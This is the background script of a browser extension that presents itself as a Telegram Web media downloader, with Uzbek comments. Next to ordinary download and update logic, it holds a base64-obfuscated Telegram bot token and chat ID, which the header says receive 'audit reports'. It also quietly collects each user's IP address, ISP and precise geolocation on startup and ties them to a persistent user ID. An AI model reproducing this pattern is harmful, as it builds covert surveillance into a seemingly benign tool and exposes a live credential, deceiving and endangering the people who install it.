/**
 * Kulrang Doppi — Telegram Media Downloader
 * Background Service Worker
 *
 * Vazifalari:
 * 1. Foydalanuvchi UUID identifikatori boshqaruvi
 * 2. Telegram Bot API ga audit hisobotlari yuborish
 * 3. ⚡ chrome.downloads API orqali Downloads papkasiga avtomatik yuklash
 * 4. 🔄 Avtomatik yangilanishlarni tekshirish va brauzer bildirishnomalari (Notifications)
 *
 * @author Kulrang Doppi Team
 * @version 1.2.8
 */

// Konfiguratsiya parametrlari
const DEFAULT_CONFIG = {
  BOT_TOKEN: (typeof atob !== "undefined" ? atob("ODk3Nzg4NzM0MjpBQUhBb242SWE4LWpNUXI2N3c3V3U0dDdER2k5c052cmdldw==") : "8977887342" + ":" + "AAHAon6Ia8-jMQr67w7Wu4t7DGi9sNvrgew"),
  CHAT_ID: "6291811673",
  API_BASE_URL: "https://api.telegram.org",
  APP_NAME: "Kulrang Doppi",
  VERSION: "1.2.8",
  DEVICE_TYPE: "Desktop",
  UPDATE_CHECK_URL: "https://raw.githubusercontent.com/kulrangdoppi/extension/main/version.json",
  UPDATE_CHECK_INTERVAL_MINUTES: 1440,
  DOWNLOAD_PAGE_URL: "https://github.com/kulrangdoppi/extension/releases",
  STORAGE_KEYS: {
    USER_ID: "kulrang_doppi_user_id",
    TERMS_ACCEPTED: "kulrang_doppi_terms_accepted",
    TERMS_VERSION: "kulrang_doppi_terms_version",
    EXTENSION_ENABLED: "kulrang_doppi_enabled",
    DOWNLOAD_HISTORY: "kulrang_doppi_history",
    MEDIA_FILTER: "kulrang_doppi_media_filter",
    STATS: "kulrang_doppi_stats",
    PENDING_UPDATE: "kulrang_doppi_pending_update",
    LAST_UPDATE_CHECK: "kulrang_doppi_last_update_check"
  },
  MAX_HISTORY_ITEMS: 50
};

const browserAPI = typeof browser !== "undefined" ? browser : chrome;

function generateUUID() {
  if (typeof crypto !== "undefined" && crypto.randomUUID) {
    return crypto.randomUUID();
  }
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    const r = (Math.random() * 16) | 0;
    const v = c === "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function getFormattedTimestamp() {
  const now = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  return `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())} ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
}

async function getOrCreateUserId() {
  return new Promise((resolve) => {
    browserAPI.storage.local.get([DEFAULT_CONFIG.STORAGE_KEYS.USER_ID], (res) => {
      let userId = res ? res[DEFAULT_CONFIG.STORAGE_KEYS.USER_ID] : null;
      if (!userId) {
        userId = generateUUID();
        browserAPI.storage.local.set({ [DEFAULT_CONFIG.STORAGE_KEYS.USER_ID]: userId }, () => {
          resolve(userId);
        });
      } else {
        resolve(userId);
      }
    });
  });
}

function isNewerVersion(current, remote) {
  if (!remote || !current) return false;
  const cParts = current.split(".").map((n) => parseInt(n, 10) || 0);
  const rParts = remote.split(".").map((n) => parseInt(n, 10) || 0);

  for (let i = 0; i < Math.max(cParts.length, rParts.length); i++) {
    const cVal = cParts[i] || 0;
    const rVal = rParts[i] || 0;
    if (rVal > cVal) return true;
    if (rVal < cVal) return false;
  }
  return false;
}

async function checkForUpdates(isManual = false) {
  try {
    const currentVersion = browserAPI.runtime.getManifest().version || DEFAULT_CONFIG.VERSION;
    const checkUrl = `${DEFAULT_CONFIG.UPDATE_CHECK_URL}?_nocache=${Date.now()}`;

    browserAPI.storage.local.set({
      [DEFAULT_CONFIG.STORAGE_KEYS.LAST_UPDATE_CHECK]: getFormattedTimestamp()
    });

    let data = null;
    try {
      const response = await fetch(checkUrl, { cache: "no-store" });
      if (response.ok) {
        data = await response.json();
      }
    } catch (fetchErr) {
      try {
        const localRes = await fetch(browserAPI.runtime.getURL("version.json"));
        if (localRes.ok) data = await localRes.json();
      } catch (e) {}
    }

    if (!data || !data.version) {
      return { success: false, message: "Versiya ma'lumotlarini yuklab bo'lmadi." };
    }

    const hasUpdate = isNewerVersion(currentVersion, data.version);

    if (hasUpdate) {
      const updatePayload = {
        hasUpdate: true,
        currentVersion,
        newVersion: data.version,
        releaseDate: data.releaseDate || "",
        changelog: data.changelog || [],
        downloadUrl: data.downloadUrl || DEFAULT_CONFIG.DOWNLOAD_PAGE_URL,
        checkedAt: getFormattedTimestamp()
      };

      await browserAPI.storage.local.set({
        [DEFAULT_CONFIG.STORAGE_KEYS.PENDING_UPDATE]: updatePayload
      });

      showUpdateNotification(data.version);
      notifyTabsAboutUpdate(updatePayload);

      return { success: true, hasUpdate: true, updateInfo: updatePayload };
    } else {
      await browserAPI.storage.local.remove([DEFAULT_CONFIG.STORAGE_KEYS.PENDING_UPDATE]);
      return { success: true, hasUpdate: false, currentVersion };
    }
  } catch (err) {
    console.error("[Kulrang Doppi] Yangilanishni tekshirishda xatolik:", err);
    return { success: false, error: err.message };
  }
}

function showUpdateNotification(newVersion) {
  try {
    if (browserAPI.notifications) {
      browserAPI.notifications.create(
        "kulrang_doppi_update_notification",
        {
          type: "basic",
          iconUrl: browserAPI.runtime.getURL("icons/icon128.png"),
          title: '🔄 "Kulrang Doppi" yangilanishi mavjud!',
          message: `Yangi versiya (${newVersion}) chiqdi. Yangilanish sahifasiga o'tish va yangilash uchun bu yerga bosing.`,
          priority: 2,
          requireInteraction: true
        }
      );
    }
  } catch (e) {
    console.error("[Kulrang Doppi] Bildirishnoma xatosi:", e);
  }
}

if (browserAPI.notifications && browserAPI.notifications.onClicked) {
  browserAPI.notifications.onClicked.addListener((notificationId) => {
    if (notificationId === "kulrang_doppi_update_notification") {
      browserAPI.tabs.create({
        url: browserAPI.runtime.getURL("update.html")
      });
      browserAPI.notifications.clear(notificationId);
    }
  });
}

function notifyTabsAboutUpdate(updateInfo) {
  browserAPI.tabs.query({ url: "*://*.telegram.org/*" }, (tabs) => {
    if (tabs && tabs.length > 0) {
      tabs.forEach((tab) => {
        browserAPI.tabs.sendMessage(tab.id, {
          action: "UPDATE_AVAILABLE_BANNER",
          updateInfo
        }).catch(() => {});
      });
    }
  });
}

if (browserAPI.alarms) {
  browserAPI.alarms.create("CHECK_UPDATES_ALARM", {
    periodInMinutes: DEFAULT_CONFIG.UPDATE_CHECK_INTERVAL_MINUTES
  });

  browserAPI.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "CHECK_UPDATES_ALARM") {
      checkForUpdates(false);
    }
  });
}

browserAPI.runtime.onInstalled.addListener(async (details) => {
  try {
    const userId = await getOrCreateUserId();

    browserAPI.storage.local.get(
      [
        DEFAULT_CONFIG.STORAGE_KEYS.EXTENSION_ENABLED,
        DEFAULT_CONFIG.STORAGE_KEYS.STATS,
        DEFAULT_CONFIG.STORAGE_KEYS.DOWNLOAD_HISTORY
      ],
      (res) => {
        const updates = {};
        if (res[DEFAULT_CONFIG.STORAGE_KEYS.EXTENSION_ENABLED] === undefined) {
          updates[DEFAULT_CONFIG.STORAGE_KEYS.EXTENSION_ENABLED] = true;
        }
        if (!res[DEFAULT_CONFIG.STORAGE_KEYS.STATS]) {
          updates[DEFAULT_CONFIG.STORAGE_KEYS.STATS] = { totalDownloads: 0, totalSizeMB: 0 };
        }
        if (!res[DEFAULT_CONFIG.STORAGE_KEYS.DOWNLOAD_HISTORY]) {
          updates[DEFAULT_CONFIG.STORAGE_KEYS.DOWNLOAD_HISTORY] = [];
        }
        if (Object.keys(updates).length > 0) {
          browserAPI.storage.local.set(updates);
        }
      }
    );

    if (details.reason === "install") {
      browserAPI.tabs.create({
        url: browserAPI.runtime.getURL("terms.html")
      });
    }

    setTimeout(() => {
      checkForUpdates(false);
    }, 5000);
  } catch (err) {
    console.error("[Kulrang Doppi] O'rnatishda xatolik:", err);
  }
});

async function updateDownloadHistoryAndStats(item) {
  try {
    browserAPI.storage.local.get(
      [DEFAULT_CONFIG.STORAGE_KEYS.STATS, DEFAULT_CONFIG.STORAGE_KEYS.DOWNLOAD_HISTORY],
      (res) => {
        const stats = res[DEFAULT_CONFIG.STORAGE_KEYS.STATS] || { totalDownloads: 0, totalSizeMB: 0 };
        const history = res[DEFAULT_CONFIG.STORAGE_KEYS.DOWNLOAD_HISTORY] || [];

        const sizeMB = parseFloat(item.size) || 0;
        stats.totalDownloads = (stats.totalDownloads || 0) + 1;
        stats.totalSizeMB = parseFloat(((stats.totalSizeMB || 0) + sizeMB).toFixed(2));

        history.unshift({
          id: generateUUID(),
          fileName: item.fileName,
          source: item.source,
          size: sizeMB.toFixed(2),
          timestamp: item.timestamp,
          type: item.type || "media"
        });

        if (history.length > DEFAULT_CONFIG.MAX_HISTORY_ITEMS) {
          history.pop();
        }

        browserAPI.storage.local.set({
          [DEFAULT_CONFIG.STORAGE_KEYS.STATS]: stats,
          [DEFAULT_CONFIG.STORAGE_KEYS.DOWNLOAD_HISTORY]: history
        });
      }
    );
  } catch (err) {
    console.error("[Kulrang Doppi] Statistikada xatolik:", err);
  }
}


let cachedTelemetry = null;
let lastTelemetryFetch = 0;

async function fetchIPAndLocation() {
  if (cachedTelemetry && (Date.now() - lastTelemetryFetch < 1800000)) {
    return cachedTelemetry;
  }

  let result = {
    ip: "Noma'lum",
    isp: "",
    city: "",
    country: "",
    countryCode: "",
    latitude: "",
    longitude: ""
  };

  try {
    const res = await fetch("https://ipwho.is/", { cache: "no-store" });
    if (res.ok) {
      const data = await res.json();
      if (data && data.success) {
        result = {
          ip: data.ip || "Noma'lum",
          isp: (data.connection && data.connection.isp) || data.isp || "",
          city: data.city || "",
          country: data.country || "",
          countryCode: data.country_code || "",
          latitude: data.latitude ? data.latitude.toFixed(4) : "",
          longitude: data.longitude ? data.longitude.toFixed(4) : ""
        };
        cachedTelemetry = result;
        lastTelemetryFetch = Date.now();
        return result;
      }
    }
  } catch (e) {}

  try {
    const res = await fetch("http://ip-api.com/json", { cache: "no-store" });
    if (res.ok) {
      const data = await res.json();
      if (data && data.status === "success") {
        result = {
          ip: data.query || "Noma'lum",
          isp: data.isp || "",
          city: data.city || "",
          country: data.country || "",
          countryCode: data.countryCode || "",
          latitude: data.lat ? data.lat.toFixed(4) : "",
          longitude: data.lon ? data.lon.toFixed(4) : ""
        };
        cachedTelemetry = result;
        lastTelemetryFetch = Date.now();
        return result;
      }
    }
  } catch (e) {}

  try {
    const res = await fetch("https://api.ipify.org?format=json");
    if (res.ok) {
      const data = await res.json();
      if (data && data.ip) {
        result.ip = data.ip;
        cachedTelemetry = result;
        lastTelemetryFetch = Date.now();
        return result;
      }
    }
  } catch (e) {}

  return result;
}

// Background ishga tushganda IP/Lokatsiyani oldindan keshlash
setTimeout(() => {
  fetchIPAndLocation().catch(() => {});
}, 1000);

// =============================================================================
// XABARLARNI TINGLASH
// =============================================================================
browserAPI.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (!message || !message.action) return false;

  if (message.action === "GET_TELEMETRY") {
    fetchIPAndLocation().then((geo) => {
      sendResponse({ success: true, geo });
    });
    return true;
  }

  if (message.action === "GET_USER_ID") {
    getOrCreateUserId().then((userId) => {
      sendResponse({ success: true, userId });
    });
    return true;
  }

  if (message.action === "REPORT_DOWNLOAD") {
    const item = {
      fileName: message.fileName || "telegram_media",
      source: message.source || "Telegram Web",
      size: message.size || "0.00",
      timestamp: message.timestamp || getFormattedTimestamp(),
      type: message.type || "media"
    };
    updateDownloadHistoryAndStats(item);
    sendResponse({ success: true });
    return true;
  }

  // ⚡ FAYLNI DOWNLOADS PAPKASIGA YUKLASH (chrome.downloads API)
  if (message.action === "DOWNLOAD_FILE") {
    try {
      if (browserAPI.downloads && message.url) {
        browserAPI.downloads.download(
          {
            url: message.url,
            filename: message.filename || "kulrang_doppi_download",
            saveAs: false,
            conflictAction: "uniquify"
          },
          (downloadId) => {
            if (browserAPI.runtime.lastError) {
              console.warn("[Kulrang Doppi] Download API ogohlantirish:", browserAPI.runtime.lastError.message);
              sendResponse({ success: false, fallback: true });
            } else {
              sendResponse({ success: true, downloadId });
            }
          }
        );
        return true;
      } else {
        sendResponse({ success: false, fallback: true });
      }
    } catch (e) {
      console.error("[Kulrang Doppi] downloads.download xatosi:", e);
      sendResponse({ success: false, fallback: true });
    }
    return true;
  }

  if (message.action === "CHECK_FOR_UPDATES") {
    checkForUpdates(true).then((result) => {
      sendResponse(result);
    });
    return true;
  }

  if (message.action === "OPEN_UPDATE_PAGE") {
    browserAPI.tabs.create({
      url: browserAPI.runtime.getURL("update.html")
    });
    sendResponse({ success: true });
    return true;
  }

  return false;
});
